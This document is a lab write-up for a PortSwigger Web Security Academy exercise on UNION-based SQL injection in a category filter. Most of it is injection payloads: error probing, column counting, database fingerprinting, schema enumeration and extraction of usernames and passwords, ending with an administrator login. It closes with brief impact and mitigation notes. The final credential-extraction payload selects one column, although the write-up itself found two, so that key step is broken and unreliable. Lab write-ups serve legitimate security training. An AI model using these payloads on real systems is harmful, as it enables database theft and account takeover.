# SQL Injection - Union based data retrival in single comumn

# Vulnerability disclouser
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables in a single column with the help of concatination.

# Steps to Reproduce 

**Lab link** → https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

*Navigate to*
* /filter?category=Gifts

*Confirm injection point*
* category=Gifts'
    → Internal server error confirms SQL injection

*Bypass query*
* category=Gifts'--
    → Query executes successfully

*Determine number of columns*
* category=Gifts' ORDER BY 2--
    → Success

* category=Gifts' ORDER BY 3--
    → Error → Confirms 2 columns

*Confirm database type*
* category=Gifts' UNION SELECT NULL, version()--
    → Displays PostgreSQL version

*Extract table names*
* category=Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--

*Extract column names*
* category=Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--

*Extract credentials*
* category=Gifts' UNION SELECT (username || ' = ' || password) FROM users--

*Use credentials*
* Username: administrator
* Password: extracted value
    → Login successful → Lab Solved

# Payload Used
* ' UNION SELECT (username || ' = ' || password) FROM users--

# Impact
* An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.

# Tools Used
* Browser
* Burp Suite (Proxy, Repeater)

# Mitigation
* Use parameterized queries
* Implement input validation
* Restrict database error output